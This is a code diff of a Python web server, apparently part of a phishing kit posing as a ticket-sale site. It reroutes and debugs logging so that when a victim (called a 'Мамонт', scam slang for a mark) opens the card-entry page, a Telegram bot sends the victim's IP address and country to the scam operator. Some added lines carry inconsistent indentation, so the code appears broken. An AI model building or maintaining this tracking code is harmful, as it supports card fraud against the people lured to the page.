@@ -324,7 +324,7 @@ def is_api_request(path):
         '/api/',        # API запити
         '/update_',     # Оновлення
         '/get_',        # get_custom_text
-        '/buy-tickets/loading/',  # Сторінки завантаження
+        # '/buy-tickets/loading/',  # ВИДАЛЕНО - це сторінка, а не API
         '/file/',       # Файли
         '/favicon.ico'  # Favicon
     ]
@@ -934,32 +934,49 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Логуємо для event creator ТІЛЬКИ якщо це сторінка з його page_code
         if extra_user_id and not is_telegram and should_log and page_code:
-            print(f"[DEBUG] Логуємо для event creator: extra_user_id={extra_user_id}, is_telegram={is_telegram}, should_log={should_log}, page_code={page_code}")
-            # Отримуємо країну за IP
-            country = get_country_by_ip(ip)
-            print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
+                    print(f"[DEBUG] Логуємо для event creator: extra_user_id={extra_user_id}, is_telegram={is_telegram}, should_log={should_log}, page_code={page_code}")
+        print(f"[DEBUG] norm_path: {norm_path}")
+        print(f"[DEBUG] orig_path: {orig_path}")
+        print(f"[DEBUG] self.path: {self.path}")
+        
+        # Отримуємо країну за IP
+        country = get_country_by_ip(ip)
+        print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
+        
+        # Логуємо ТІЛЬКИ для event creator на сторінці введення карти
+        if '/buy-tickets/loading/' in norm_path and extra_user_id:
+            print(f"[DEBUG] 🎯 Знайдено сторінку введення карти: {norm_path}")
+            print(f"[DEBUG] 📱 Надсилаємо лог event creator: {extra_user_id}")
             
-            # Логуємо ТІЛЬКИ для event creator на сторінці введення карти
-            if '/buy-tickets/loading/' in norm_path and extra_user_id:
-                # Логуємо з російською назвою "Ввод карты" в потрібному форматі
-                message = (
-                    f"🔔Мамонт открыл страницу\n\n"
-                    f"📎Страница: Ввод карты\n"
-                    f"#️⃣Ссылка: ?page={page_code}\n"
-                    f"📶IP: {ip}\n"
-                    f"🌎Страна: {country}"
-                )
-                
-                # Надсилаємо event creator
-                try:
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    data = {"chat_id": extra_user_id, "text": message}
-                    requests.post(url, data=data, timeout=1)
-                    print(f"📤 Лог надіслано event creator {extra_user_id}")
-                except Exception as e:
-                    print(f"❌ Помилка надсилання event creator: {e}")
-            # Логуємо інші сторінки для event creator
-            elif extra_user_id and should_log and page_code:
+            # Логуємо з російською назвою "Ввод карты" в потрібному форматі
+            message = (
+                f"🔔Мамонт открыл страницу\n\n"
+                f"📎Страница: Ввод карты\n"
+                f"#️⃣Ссылка: ?page={page_code}\n"
+                f"📶IP: {ip}\n"
+                f"🌎Страна: {country}"
+            )
+            
+            # Надсилаємо event creator
+            try:
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                data = {"chat_id": extra_user_id, "text": message}
+                response = requests.post(url, data=data, timeout=1)
+                if response.status_code == 200:
+                    print(f"✅ Лог надіслано event creator {extra_user_id}")
+                    print(f"📝 Повідомлення: {message}")
+                else:
+                    print(f"❌ Помилка надсилання: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання event creator: {e}")
+        else:
+            print(f"[DEBUG] ❌ Не логуємо сторінку введення карти:")
+            print(f"[DEBUG]   - norm_path: {norm_path}")
+            print(f"[DEBUG]   - '/buy-tickets/loading/' in norm_path: {'/buy-tickets/loading/' in norm_path}")
+            print(f"[DEBUG]   - extra_user_id: {extra_user_id}")
+        
+        # Логуємо інші сторінки для event creator
+        if extra_user_id and should_log and page_code:
                 # Отримуємо назву сторінки
                 page_name = get_page_name(norm_path)
                 
